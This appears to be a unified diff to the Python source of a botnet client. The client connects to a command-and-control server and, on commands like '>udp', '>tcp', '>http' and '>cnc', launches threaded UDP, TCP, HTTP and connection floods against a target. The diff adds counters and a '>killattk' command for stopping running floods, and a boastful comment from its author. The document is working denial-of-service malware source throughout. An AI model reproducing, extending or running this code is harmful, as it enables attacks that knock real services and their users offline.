@@ -1,3 +1,5 @@
+# Please do not change ANYTHING. As it may mess everything up.
+# Also, I am a frickin genius!
 import os
 import sys
 import time
@@ -11,6 +13,9 @@ host = "localhost" # IP for the bot to connect to
 port = 8000 # Port for the bot to connect to
 
 connected = False
+
+attk = True
+active = 0
 
 userAgents = []
 
@@ -63,7 +68,11 @@ def system():
 	while connected is True:
 		try:
 			def commands():
+				global attk
+				global active
+
 				msg = sock.recv(1024)
+
 				if ">killbots" in msg.lower():
 					try:
 						sys.exit()
@@ -79,6 +88,8 @@ def system():
 
 				if ">udp" in msg.lower():
 					def udpflood():
+						global attk
+						global active
 						try:
 							def udpflooder():
 								try:
@@ -98,6 +109,7 @@ def system():
 
 							print("Command Accepted!")
 							print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+							active += 1
 
 							while True:
 								thread = threading.Thread(target=udpflooder)
@@ -105,6 +117,11 @@ def system():
 								thread.start()
 								thread.join()
 								if time.time() > timeout:
+									active -= 1
+									return
+								if attk == False:
+									active -= 1
+									print("UDP: Attack Killed!")
 									return
 						except:
 							pass
@@ -112,6 +129,8 @@ def system():
 
 				if ">tcp" in msg.lower():
 					def tcpflood():
+						global attk
+						global active
 						try:
 							def tcpflooder():
 								try:
@@ -133,6 +152,7 @@ def system():
 
 							print("Command Accepted!")
 							print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+							active += 1
 
 							while True:
 								thread = threading.Thread(target=tcpflooder)
@@ -140,6 +160,11 @@ def system():
 								thread.start()
 								thread.join()
 								if time.time() > timeout:
+									active -= 1
+									return
+								if attk == False:
+									active -= 1
+									print("TCP: Attack Killed!")
 									return
 						except:
 							pass
@@ -147,6 +172,8 @@ def system():
 
 				if ">http" in msg.lower():
 					def httpflood():
+						global attk
+						global active
 						try:
 							def httpflooder():
 								try:
@@ -168,6 +195,7 @@ def system():
 
 							print("Command Accepted!")
 							print("HTTP: Sent to %s with %s threads for %s seconds!" % (ip, threads, timer))
+							active += 1
 
 							while True:
 								for x in range(threads):
@@ -176,6 +204,11 @@ def system():
 									thread.start()
 									thread.join()
 									if time.time() > timeout:
+										active -= 1
+										return
+									if attk == False:
+										active -= 1
+										print("HTTP: Attack Killed!")
 										return
 						except:
 							pass
@@ -183,7 +216,8 @@ def system():
 
 				if ">cnc" in msg.lower():
 					def cncflood():
-						import socket
+						global attk
+						global active
 						try:
 							def cncflooder():
 								try:
@@ -199,16 +233,34 @@ def system():
 
 							print("Command Accepted!")
 							print("CNC: Sent to %s on port %s %s times!" % (ip, port, amount))
+							active += 1
 
 							for x in range(amount):
 								thread = threading.Thread(target=cncflooder)
 								thread.Deamon = True
 								thread.start()
 								thread.join()
+								if attk == False:
+									active -= 1
+									print("CNC: Attack Killed!")
+									return
+							active -= 1
 						except:
 							pass
-							
 					cncflood()
+
+				if ">killattk" in msg.lower():
+					try:
+						attk = False
+					except:
+						pass
+
+				if active == 0:
+					try:
+						attk = True
+					except:
+						pass
+
 			commands()
 			threads = []
 			for i in range(100):
